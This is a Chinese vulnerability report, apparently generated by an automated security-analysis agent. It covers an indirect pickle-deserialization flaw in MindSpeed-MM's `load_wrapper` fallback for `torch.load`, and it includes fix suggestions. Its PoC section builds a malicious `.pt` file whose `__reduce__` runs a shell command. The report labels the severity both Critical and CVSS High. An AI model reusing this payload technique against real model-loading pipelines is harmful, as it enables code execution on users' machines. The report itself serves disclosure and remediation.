# tools_load_weights-CWE502-indirect-pickle-001：torch.load失败回退触发间接Pickle反序列化RCE

## 漏洞基本信息

| 属性 | 值 |
|------|------|
| **漏洞 ID** | tools_load_weights-CWE502-indirect-pickle-001 |
| **类型** | Indirect Pickle Deserialization (CWE-502) |
| **严重级别** | Critical |
| **置信度** | 90% |
| **文件位置** | `tools/load_ms_weights_to_pt/checkpointing.py:3-11` |
| **函数名称** | `load_wrapper` |

## 漏洞描述

`load_wrapper` 装饰器包装 `torch.load` 函数，当原始调用失败时，自动回退到 `load_ms_weights`。这意味着任何使用该装饰器的代码都可能触发 pickle 反序列化漏洞，攻击者可以通过构造特殊的 `.pt` 文件来触发 RCE。

## 源代码分析

### 漏洞代码片段

```python
# checkpointing.py:3-11
from functools import wraps

def load_wrapper(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        try:
            res = fn(*args, **kwargs)  # 尝试原始 torch.load
        except:
            # ⚠️ 失败时回退到 load_ms_weights
            from tools.load_ms_weights_to_pt.serialization import load_ms_weights
            res = load_ms_weights(*args, **kwargs)  # 触发漏洞
        return res
    return wrapper
```

### 安全分析

**漏洞触发机制**：

1. `torch.load` 正常加载 `.pt` 文件
2. 如果文件格式不符合预期（如 MindSpore 格式），`torch.load` 抛出异常
3. 异常被捕获后，自动调用 `load_ms_weights`
4. `load_ms_weights` 使用不安全的 pickle 反序列化 → RCE

**关键问题**：

- `except:` 捕获所有异常，包括格式错误、IO 错误等
- 没有验证回退路径的安全性
- 用户传入的文件路径直接传递给 `load_ms_weights`

## 数据流追踪

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 数据流路径                                                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│ torch.load args                                                               │
│     ↓                                                                        │
│ load_wrapper@checkpointing.py:3                                               │
│     ↓                                                                        │
│ fn(*args, **kwargs) → torch.load → 可能失败                                  │
│     ↓ (异常触发)                                                              │
│ load_ms_weights@serialization.py:384                                         │
│     ↓                                                                        │
│ [SINK: pickle_deserialization] ⚠️                                            │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 跨模块调用关系

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 跨模块调用链                                                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  mindspeed_mm.feature_dataset                                                │
│       │                                                                      │
│       ├──→ FeatureDataset.get_data_from_feature_data                        │
│       │         │                                                            │
│       │         └──→ torch.load (可能被 load_wrapper 包装)                  │
│       │               │                                                      │
│       │               └──→ load_wrapper (异常回退)                          │
│       │                     │                                                │
│       │                     └──→ load_ms_weights                            │
│       │                           │                                          │
│       │                           └──→ UnpicklerWrapper.load                │
│       │                                 │                                    │
│       │                                 └──→ [RCE]                          │
│       │                                                                      │
│  tools_load_weights                                                          │
│       │                                                                      │
│       ├──→ checkpointing.py:load_wrapper                                    │
│       │                                                                      │
│       └──→ serialization.py:load_ms_weights                                 │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 漏洞利用条件和攻击场景

### 利用条件

| 条件 | 说明 |
|------|------|
| **攻击向量** | 触发 torch.load 异常后回退 |
| **攻击复杂度** | 低（构造触发异常的文件） |
| **所需权限** | 无 |
| **用户交互** | 无（自动回退） |
| **作用域** | 代码执行环境 |

### 攻击场景

**场景 1: 诱导式攻击**

攻击者构造一个"半损坏"的 `.pt` 文件：

```
恶意 .pt 文件 → torch.load 尝试解析 → 格式异常 → load_wrapper 回退 → load_ms_weights → RCE
```

**场景 2: 多模态模型攻击**

MindSpeed-MM 使用 `FeatureDataset` 加载特征数据：

```
用户加载多模态数据集 → FeatureDataset.get_data_from_feature_data → torch.load → 
异常 → load_wrapper 回退 → RCE
```

### PoC 示例

```python
import torch
import pickle
import os
import zipfile

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

# 构造一个 torch.load 无法正常解析的文件
# 但 load_ms_weights 可以解析的文件

def create_malicious_pt_file(filepath):
    with zipfile.ZipFile(filepath, 'w') as zf:
        # 构造 torch.load 会失败的格式
        # 但 pickle 结构正确
        payload = pickle.dumps({'__malicious__': MaliciousPayload()})
        zf.writestr('data.pkl', payload)
        zf.writestr('byteorder', b'little')
        # 添加一个无效的 torch header 使 torch.load 失败
        zf.writestr('invalid_header', b'NOT_A_TORCH_FILE')

create_malicious_pt_file('malicious_feature.pt')

# 触发漏洞
from tools.load_ms_weights_to_pt.checkpointing import load_wrapper

@load_wrapper
def load_feature(path):
    return torch.load(path)

load_feature('malicious_feature.pt')  # → RCE
```

## 危害评估和影响范围

### CVSS 评分

| 指标 | 值 | 说明 |
|------|------|------|
| Attack Vector (AV) | Local | 通过本地文件触发 |
| Attack Complexity (AC) | Low | 构造触发异常的文件 |
| Privileges Required (PR) | None | 无需特殊权限 |
| User Interaction (UI) | Required | 需要用户加载文件 |
| Scope (S) | Changed | 影响其他组件 |
| Confidentiality (C) | High | 完全读取权限 |
| Integrity (I) | High | 完全写入权限 |
| Availability (A) | High | 系统崩溃风险 |

**CVSS 评分**: **8.8 (High)**

### 影响范围

**直接影响模块**：

1. `tools/load_ms_weights_to_pt/checkpointing.py`
2. `tools/load_ms_weights_to_pt/serialization.py`

**间接影响模块**：

1. `mindspeed_mm.data.datasets.feature_dataset` - 通过 `torch.load` 间接触发
2. 任何使用 `load_wrapper` 装饰器的代码

**攻击链可达性**：

```
入口点: FeatureDataset.get_data_from_feature_data
       ↓
调用: torch.load(feature_path)
       ↓
包装: load_wrapper (如果被应用)
       ↓
回退: load_ms_weights
       ↓
漏洞: UnpicklerWrapper.load → RCE
```

## 修复建议

### 短期修复

**1. 移除或限制 load_wrapper 的异常回退**

```python
# checkpointing.py
def load_wrapper(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        try:
            res = fn(*args, **kwargs)
        except Exception as e:
            # 记录异常类型，不要盲目回退
            logging.error(f"torch.load failed: {type(e).__name__}: {e}")
            # 只在特定异常类型下回退
            if isinstance(e, (RuntimeError, ValueError)):
                # 添加安全检查
                if not is_safe_weight_file(args[0]):
                    raise SecurityError("Unsafe weight file detected")
                from tools.load_ms_weights_to_pt.serialization import safe_load_ms_weights
                res = safe_load_ms_weights(*args, **kwargs)
            else:
                raise  # 其他异常直接抛出
        return res
    return wrapper
```

**2. 添加文件类型验证**

```python
def is_safe_weight_file(filepath):
    """验证文件是否为安全的权重文件"""
    import magic  # python-magic
    
    # 检查文件类型
    file_type = magic.from_file(filepath)
    if 'Zip archive' not in file_type:
        return False
    
    # 检查 zip 内容是否为合法的权重文件结构
    with zipfile.ZipFile(filepath, 'r') as zf:
        required_files = ['data.pkl', 'byteorder']
        for req in required_files:
            if req not in zf.namelist():
                return False
    
    return True
```

### 长期修复

**1. 分离加载逻辑**

```python
# 不要使用装饰器自动回退
# 明确区分两种加载方式

def load_torch_weights(filepath):
    """标准 torch.load"""
    return torch.load(filepath, weights_only=True)

def load_mindspeed_weights(filepath):
    """MindSpore 权重加载（带安全检查）"""
    verify_file(filepath)
    return safe_load_ms_weights(filepath)
```

**2. 添加审计和警告**

```python
import logging
logger = logging.getLogger('mindspeed.security')

def load_wrapper(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        logger.warning(f"load_wrapper fallback may trigger: {args}")
        # ...
```

## 参考资料

1. [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
2. [Python decorators security risks](https://realpython.com/python-decorators-security/)
3. [异常处理安全最佳实践](https://owasp.org/www-community/vulnerabilities/Improper_Error_Handling)

---

**报告生成时间**: 2026-04-20  
**分析 Agent**: details-analyzer  
**严重级别**: Critical ⚠️  
**关联漏洞**: tools_load_weights-CWE502-pickle-deser-001